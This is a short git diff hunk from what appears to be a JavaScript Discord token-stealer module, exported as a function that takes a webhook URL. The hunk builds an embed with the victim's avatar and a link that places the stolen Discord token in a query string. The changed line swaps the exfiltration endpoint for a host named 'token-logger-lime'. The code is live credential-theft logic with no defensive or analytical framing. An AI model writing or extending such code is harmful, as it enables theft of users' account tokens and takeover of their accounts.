@@ -224,7 +224,7 @@ module.exports = async (webhookUrl) => {
             const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
             const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;
 
-            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
+            const copy = `https://token-logger-lime.vercel.app/api/raw?data=${token}`;
 
             const data = {
                 embeds: [
